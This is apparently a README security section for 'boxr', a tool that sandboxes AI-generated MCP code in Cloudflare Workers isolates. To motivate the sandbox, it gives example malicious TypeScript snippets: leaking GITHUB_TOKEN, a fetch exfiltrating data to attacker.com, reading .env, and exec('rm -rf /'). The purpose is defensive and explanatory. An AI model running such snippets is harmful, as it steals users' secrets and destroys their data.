# Security Section for README

## 🔒 Security: Why Isolates Matter

Running AI-generated code is inherently risky. **boxr** (or your chosen name) uses Cloudflare Workers isolates to create a zero-trust execution environment where even malicious code can't escape the sandbox.

### The Problem with Traditional MCP Execution

When AI agents execute MCP tools directly, malicious or buggy code can:

```typescript
// ❌ Steal credentials
console.log(process.env.GITHUB_TOKEN);

// ❌ Exfiltrate data over the network  
await fetch('https://attacker.com/steal', {
  body: JSON.stringify(sensitiveData)
});

// ❌ Access the filesystem
const secrets = require('fs').readFileSync('.env', 'utf8');

// ❌ Execute arbitrary commands
require('child_process').exec('rm -rf /');
```

### How boxr Protects You

**boxr** runs all code in isolated Workers with three layers of security:

#### 1. **Network Isolation** 
```typescript
globalOutbound: null  // All fetch() calls blocked
```
✅ No data exfiltration  
✅ No SSRF attacks  
✅ No unauthorized API calls

#### 2. **Credential Hiding**
API keys never enter the isolate. MCP bindings handle authentication transparently.

✅ No credential theft  
✅ No secret leakage  
✅ No token exposure

#### 3. **Sandboxed Execution**
No filesystem, no process access, no Node.js APIs.

✅ No file system access  
✅ No command execution  
✅ No system manipulation

### Security Comparison

| Attack Vector | Traditional MCP | boxr (Workers Isolates) |
|--------------|-----------------|-------------------------|
| **Network data theft** | ⚠️ Vulnerable | ✅ **Blocked** |
| **Credential leakage** | ⚠️ Vulnerable | ✅ **Impossible** |
| **File system access** | ⚠️ Vulnerable | ✅ **Blocked** |
| **SSRF attacks** | ⚠️ Vulnerable | ✅ **Blocked** |
| **Code injection** | ❌ No protection | ✅ **Validated** |
| **Resource exhaustion** | ⚠️ Limited protection | ✅ **Hard limits** |

### Real-World Impact

**Even if an AI agent generates malicious code, it cannot:**
- ❌ Steal data over the network
- ❌ Access your API keys or secrets
- ❌ Read or write files on your system
- ❌ Execute shell commands
- ❌ Access internal services (SSRF)
- ❌ Affect other executions

**It can only:**
- ✅ Call the specific MCP operations you've explicitly allowed
- ✅ Process data within its memory sandbox
- ✅ Return results via `console.log()`

### The Bottom Line

**boxr creates a zero-trust execution environment.** Every execution runs in a fresh, disposable V8 isolate with:
- 🔒 No network access
- 🔒 No credentials
- 🔒 No filesystem
- 🔒 Resource limits (CPU, memory, time)
- 🔒 Complete isolation from other executions

This makes it **safe to execute AI-generated code**, even from untrusted sources, while maintaining the performance benefits of code mode execution.

---

*Want to learn more? See our [Security Analysis](./docs/SECURITY_ANALYSIS.md) for detailed attack vector breakdowns and mitigation strategies.*
